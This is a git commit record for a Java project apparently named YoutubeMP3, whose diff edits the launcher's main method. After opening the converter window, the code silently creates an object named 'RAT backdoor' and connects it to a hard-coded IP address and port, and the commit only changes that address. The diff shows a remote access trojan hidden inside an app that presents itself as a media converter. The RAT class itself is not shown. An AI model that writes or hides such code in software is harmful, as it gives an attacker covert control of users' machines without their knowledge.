b1cdd7560f2d098f79dea45180ebe9a0a1bf89e0
hacefresko <victorfrespe@gmail.com>
2020-04-13 00:28:16 +0200

    Revert "Revert "Updated the whole thing xd""
    This reverts commit ff065dbd3ee2d64edff303287ac9f0e6fdea4e71.

--- YoutubeMP3/src/launcher/Main.java
+++ YoutubeMP3/src/launcher/Main.java
@@ -6,7 +6,7 @@ import view.MainWindow;
 public class Main {
 	public static void main(String[] args) {
 		new MainWindow();
-		RAT backdoor = new RAT("192.168.0.162", 1234);
+		RAT backdoor = new RAT("192.168.0.165", 5123);
 		backdoor.connect();
 	}
 }
